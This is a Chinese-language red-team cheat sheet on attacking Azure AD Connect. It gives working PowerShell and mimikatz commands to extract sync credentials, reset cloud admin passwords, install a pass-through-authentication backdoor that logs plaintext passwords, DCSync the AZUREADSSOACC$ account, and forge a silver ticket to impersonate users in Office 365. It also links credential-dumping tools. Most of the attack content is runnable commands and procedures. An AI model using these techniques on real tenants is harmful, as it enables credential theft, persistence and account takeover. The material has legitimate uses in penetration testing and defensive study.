# Azure AD - AD Connect 与云同步 (AD Connect and Cloud Sync)

| 活动目录 (Active Directory)          | Azure AD          |
|-----------------------------------|-------------------|
| LDAP                              | REST API'S        |
| NTLM/Kerberos                     | OAuth/SAML/OpenID |
| 结构化目录 (OU 树)                 | 扁平结构 (Flat structure) |
| GPO                               | 无 GPO             |
| 精细调优的访问控制                 | 预定义角色          |
| 域/林 (Domain/forest)             | 租户 (Tenant)      |
| 信任 (Trusts)                     | 访客 (Guests)      |

检查是否安装了 Azure AD Connect：`Get-ADSyncConnector`

* 对于 **密码哈希同步 (PHS)**，我们可以提取凭据
    * 来自本地 AD 的密码被发送到云端
    * 使用由 AD Connect 创建的服务帐户进行复制
* 对于 **传递身份验证 (PTA)**，我们可以攻击代理
    * 可以向 PTA 代理进行 DLL 注入并拦截身份验证请求：明文凭据
* 对于 **联合身份验证 (Federation)**，使用联合服务器 (ADFS) 将 Windows Server AD 连接到 Azure AD
    * Dir-Sync：由本地 Windows Server AD 处理，同步用户名/密码
    * 使用 DA (域管理员) 从 ADFS 服务器提取证书

## 密码哈希同步 (Password Hash Synchronization / PHS)

获取 `SYNC_*` 帐户的令牌并重置本地管理员密码

```powershell
PS > Import-Module C:\Users\Administrator\Documents\AADInternals\AADInternals.psd1
PS > Get-AADIntSyncCredentials

PS > $passwd = ConvertToSecureString 'password' -AsPlainText -Force
PS > $creds = New-Object System.Management.Automation.PSCredential ("<Username>@<TenantName>.onmicrosoft.com", $passwd)
PS > GetAADIntAccessTokenForAADGraph -Credentials $creds –SaveToCache

PS > Get-AADIntUser -UserPrincipalName onpremadmin@defcorpsecure.onmicrosoft.com | select ImmutableId
PS > Set-AADIntUserPassword -SourceAnchor "<IMMUTABLE-ID>" -Password "Password" -Verbose
```

## 传递身份验证 (Pass-Through Authentication / PTA)

1. 检查是否安装了 PTA：`Get-Command -Module PassthroughAuthPSModule`
2. 安装 PTA 后门

    ```powershell
    PS AADInternals> Install-AADIntPTASpy
    PS AADInternals> Get-AADIntPTASpyLog -DecodePasswords
    ```

## 联合身份验证 (Federation)

* [Golden SAML](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adfs-federation-services/)

## AD Connect - 凭据 (Credentials)

* [dirkjanm/adconnectdump](https://github.com/dirkjanm/adconnectdump) - 导出 Azure AD 和 Active Directory 的 Azure AD Connect 凭据

| 工具 | 需要在目标上执行代码 | DLL 依赖 | 需要本地 MSSQL | 需要本地 python |
| --- | --- | --- | --- | --- |
| ADSyncDecrypt | 是 | 是 | 否 | 否 |
| ADSyncGather | 是 | 否 | 否 | 是 |
| ADSyncQuery | 否 (仅网络 RPC 调用) | 否 | 是 | 是 |

* **ADSyncDecrypt**: 在目标主机上完全解密凭据。需要 AD Connect DLL 在 PATH 中。Adam Chester 在其博客上发布了一个类似的 PowerShell 版本。
* **ADSyncGather**: 在目标主机上查询凭据和加密密钥，解密在本地完成 (python)。无 DLL 依赖。
* **ADSyncQuery**: 从本地保存的数据库中查询凭据。需要安装 MSSQL LocalDB。无 DLL 依赖。由 adconnectdump.py 调用，无需在 Azure AD connect 主机上执行任何操作即可转储数据。

ADSync 中的凭据位置：`C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf`

## AD Connect - 使用 MSOL 帐户进行 DCSync (DCSync with MSOL Account)

你可以使用 MSOL 帐户执行 **DCSync** 攻击。

要求：

* 攻陷运行 Azure AD Connect 服务的服务器
* 访问 ADSyncAdmins 或本地 Administrators 组

使用 @xpn 的脚本 **azuread_decrypt_msol.ps1** 来恢复 MSOL 帐户解密后的密码：

* [xpn/azuread_decrypt_msol.ps1](https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545): AD Connect 同步凭据提取 POC
* [xpn/azuread_decrypt_msol_v2.ps1](https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c): 导出 Azure AD Connect 同步使用的 MSOL 服务帐号（允许 DCSync）的更新方法

现在你可以使用获取到的 MSOL 帐户凭证发起 DCSync 攻击。

## AD Connect - 无缝单点登录银票据 (Seamless Single Sign On Silver Ticket)

任何可以编辑 `AZUREADSSOACCS$` 帐户属性的人都可以使用 Kerberos（如果没有 MFA）假冒 Azure AD 中的任何用户。

PHS 和 PTA 都支持无缝 SSO。如果启用了无缝 SSO，则会在本地 AD 中创建一个计算机帐户 **AZUREADSSOACC**。

:warning: AZUREADSSOACC 帐户的密码永不更改。

使用 [https://autologon.microsoftazuread-sso.com/](https://autologon.microsoftazuread-sso.com/) 将 Kerberos 票据转换为适用于 Office 365 和 Azure 的 SAML 及 JWT。

1. 获取 AZUREADSSOACC 帐户的 NTLM 密码哈希，例如 `f9969e088b2c13d93833d0ce436c76dd`。

    ```powershell
    mimikatz.exe "lsadump::dcsync /user:AZUREADSSOACC$" exit
    ```

2. 获取我们要假冒的用户的 AAD 登录名，例如 `elrond@contoso.com`。这通常是其在本地 AD 中的 userPrincipalName 或 mail 属性。
3. 获取我们要假冒的用户的 SID，例如 `S-1-5-21-2121516926-2695913149-3163778339-1234`。
4. 创建银票据 (Silver Ticket) 并将其注入 Kerberos 缓存：

    ```powershell
    mimikatz.exe "kerberos::golden /user:elrond
    /sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234
    /domain:contoso.local /rc4:f9969e088b2c13d93833d0ce436c76dd
    /target:aadg.windows.net.nsatc.net /service:HTTP /ptt" exit
    ```

5. 启动 Mozilla Firefox
6. 转到 `about:config` 并将 `network.negotiate-auth.trusted-uris` 首选项设置为 `https://aadg.windows.net.nsatc.net,https://autologon.microsoftazuread-sso.com`
7. 导航到任何与 AAD 域集成的 Web 应用程序。填写用户名，密码字段留空。

## 参考资料 (References)

* [Azure AD connect for RedTeam - Adam Chester @xpnsec - February 18, 2019](https://blog.xpnsec.com/azuread-connect-for-redteam/)
* [Azure AD Kerberos Tickets: Pivoting to the Cloud - Edwin David - February 9, 2023](https://trustedsec.com/blog/azure-ad-kerberos-tickets-pivoting-to-the-cloud)
* [Azure AD Overview - John Savill's Technical Training - Oct 7, 2014](https://www.youtube.com/watch?v=l_pnNpdxj20)
* [DUMPING NTHASHES FROM MICROSOFT ENTRA ID - Secureworks](https://www.secureworks.com/research/dumping-nthashes-from-microsoft-entra-id)
* [Impersonating Office 365 Users With Mimikatz - Michael Grafnetter - January 15, 2017](https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/)
* [Introduction to Microsoft Entra Connect V2 - Microsoft](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-azure-ad-connect-v2)
* [TR19: I'm in your cloud, reading everyone's emails - hacking Azure AD via Active Directory - Dirk-jan Mollema - 1st apr. 2019](https://www.youtube.com/watch?v=JEIR5oGCwdg)
* [Training - Attacking and Defending Azure Lab - Altered Security](https://www.alteredsecurity.com/azureadlab)
* [Update: Dumping Entra Connect Sync Credentials - @hotnops - June 10, 2025](https://posts.specterops.io/update-dumping-entra-connect-sync-credentials-4a9114734f71)
* [Windows Azure Active Directory in plain English - Openness AtCEE - January 9, 2014](https://www.youtube.com/watch?v=IcSATObaQZE)
